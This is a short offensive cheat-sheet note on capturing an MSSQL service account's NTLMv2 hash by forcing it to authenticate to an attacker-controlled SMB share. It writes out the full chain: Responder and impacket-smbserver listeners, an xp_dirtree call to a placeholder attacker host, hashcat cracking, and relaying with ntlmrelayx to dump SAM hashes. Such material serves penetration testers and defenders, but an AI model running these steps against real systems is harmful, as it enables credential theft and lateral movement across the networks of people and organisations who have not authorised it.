# MSSQL xp_dirtree — NTLMv2 Hash Stealing

No CVE, no exploit — abuses Windows SMB authentication. MSSQL service account authenticates to your SMB listener when `xp_dirtree` tries to list a remote share → you capture its NTLMv2 hash.

Already covered in the attacking SQL section, but the concept chain:

Source: attacker-controlled UNC path passed to `xp_dirtree` → Process: MSSQL queries the share → Privileges: MSSQL service account context (often high-priv) → Destination: your Responder/smbserver

Catch with Responder:

```bash
sudo responder -I <IFACE>
```

Or impacket-smbserver:

```bash
sudo impacket-smbserver share ./ -smb2support
```

Trigger from inside MSSQL:

```sql
EXEC master..xp_dirtree '\\<ATTACK_HOST>\share\'
GO
```

Crack the captured NTLMv2:

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST>
```

Can't crack → relay with `impacket-ntlmrelayx` to any host where SMB signing is off.

> [!tip] The MSSQL service account often has elevated OS privileges. Even if you can't crack the hash, relay it — if the account has local admin anywhere on the network, `ntlmrelayx` will dump SAM automatically.